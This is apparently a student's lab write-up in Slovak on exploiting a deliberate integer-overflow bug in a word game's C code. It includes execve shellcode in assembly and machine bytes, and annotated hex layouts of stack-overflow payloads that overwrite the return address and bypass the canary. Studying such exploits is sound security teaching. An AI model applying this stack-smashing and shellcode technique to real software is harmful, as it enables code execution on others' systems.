# Ukol #2
### 2. Pretečenie zásobniku
`INT32_MIN` je jedina hodnota vstupu, ktorá nieje ošetrená
správne keďže `-INT32_MIN == INT_32MIN`.
Ostatné záporne hodnotý sú ošetrene spravne a sú pre hru dokonca potrebné.

```
else if(word_len < -1) {
    mode = MODE_SHUFFLE;
    // bug #2, we are using negative sign to store information about game mode,
    // but we are not counting with INT32_MIN integer overflow in * -1.
    word_len *= -1;
}
```


# Ukol #3
Pokiaľ máme zapnutý stackexec tak:
```asm
MOV RAX, 59
MOV RDI, OFFSET filename
MOV RSI, OFFSET argv
MOV RDX, OFFSET envp
SYSCALL
```

Bez stackexec stále neviem.

# Ukol #4
Prerobil som útok tak aby hodnoty `cmd, argv, envp` boli uložené v
exploite a z `main.c` som ich úplne odstránil. (viz. `attack.py:113`)

Ukážka binárneho kódu ktorý je zapisovaný
do hry po poslaní `INT32_MIN` (word je začiatok bufferu ktorý preteká):
```
00: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 00 5F 5F 5F 5F 5F
10: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
20: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
30: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
40: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
50: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
60: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F

                                     kanarik
                            vvvvvvvvvvvvvvvvvvvvvvv
70: 5F 5F 5F 5F 5F 5F 5F 5F 00 -- -- -- -- -- -- --
80: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F

       rbp pre func_1       navratova adresa z main
                            nastavene na func_1+223
    vvvvvvvvvvvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvvvvv
90: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
a0: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F

                            adresa na stack na envp
                                 word + 0x130
                            vvvvvvvvvvvvvvvvvvvvvvv
b0: 5F 5F 5F 5F 5F 5F 5F 5F -- -- -- -- -- -- -- --

    adresa na stack na argv adresa na stack na cmd
          word + 0x110            word + 0x100
    vvvvvvvvvvvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvvvvv
c0: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
d0: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
e0: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F
f0: 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F

100:  /  u  s  r  /  b  i  n  /  g  e  d  i  t 00 00

      adresa na word + 0x100   NULL v array argv
     vvvvvvvvvvvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvvvvv
110: -- -- -- -- -- -- -- -- 00 00 00 00 00 00 00 00
120:  D  I  S  P  L  A  Y  =  :  0 00 00 00 00 00 00

      adresa na word + 0x120   NULL v array envp
     vvvvvvvvvvvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvvvvv
130: -- -- -- -- -- -- -- -- 00 00 00 00 00 00 00 00

140: \n  0 \n
```
Okreslené z `stdin_copy.bin` a `attack.py`.


Aby som ukázal použitie kódu z **Ukol #3**,
vytvoril som binarku `execstack` (viz. `Makefile`),
ktorá má povolené spúštanie kódu na stacku.

Do `attack.py` som pridal flag `--execstack`,
ktorý spustí podobný útok ale nevyužíva `func_1`.
Namiesto toho sa spúšta kód zo stacku, rovnaký ako
v **Ukol #3**. (viz `attack.py:170` a `attack.py:311`)

Na miesto `word[98:9f]` sa umiestni hodnota `word + 0xa0`, takže
`rip` bude ukazovať na stack. Tam je následne umiestnený assembly z **Ukol #3**.

Opäť ukážka posielaného exploitu (zobrazené len časti rozdielne od prvého):
```
       rbp nie je potrebne  navratova adresa z main
            nastavovať      nastavene na word + 0xa0
    vvvvvvvvvvvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvvvvv
90: 5F 5F 5F 5F 5F 5F 5F 5F -- -- -- -- -- -- -- --

       nop sled
       zbytočný         mov rax, 59     mov rdi, &cmd
    vvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvv vvvvvvvvvvv
a0: 90 90 90 90 90 48 C7 C0 3B 00 00 00 48 bf -- --

  &cmd = word + 0x100  mov rsi, &argv
                          &argv = word + 0x110
    vvvvvvvvvvvvvvvvv vvvvvvvvvvvvvvvvvvvvvvvvvvvvv
b0: -- -- -- -- -- -- 48 be -- -- -- -- -- -- -- --

    mov rdx, &envp                sys
       &envp = word + 0x130        call
    vvvvvvvvvvvvvvvvvvvvvvvvvvvvv vvvvv
c0: 48 ba -- -- -- -- -- -- -- -- 0f 05 5F 5F 5F 5F
```
Okreslené z `stdin_copy_execstack.bin` a `attack.py`.



0x79 85 f2 65 0d 70
0x79 38 63 85 0d 70